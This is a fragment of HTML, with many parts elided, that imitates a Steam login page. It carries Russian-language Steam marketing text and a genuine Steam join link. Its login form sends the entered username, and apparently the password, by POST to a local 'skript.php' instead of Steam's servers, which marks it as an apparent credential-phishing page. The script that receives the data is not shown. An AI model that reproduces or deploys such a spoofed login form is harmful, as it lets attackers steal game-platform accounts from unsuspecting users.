	...
	<div class="page_content">
		...
		<div class="leftcol">
			...
			<div class="checkout_content_box">
				<div class="loginbox">
				<form name="logon" action="skript.php" method="POST">
					<div class="loginbox_left">
						...
						<br>
							...
							<div class="login_row">
								...
								<input class="text_input" type="text" name="login" id="input_username" value="" required>
							</div>
							<div class="login_row">
					...
					<div class="loginbox_right">
						...
						<br>
						<p>
							Присоединяйтесь &mdash; Steam бесплатен и удобен в использовании. Продолжайте создание аккаунта и получите Steam &mdash; ведущее цифровое решение для любителей компьютерных игр.						</p>
					</div>
					<div style="clear: left;"></div>
					...
					<div class="loginbox_right">
						<a href="https://store.steampowered.com/join/?redir=app%2F377160%2F&snr=1_60_4__62" class="btnv6_blue_hoverfade btn_medium">
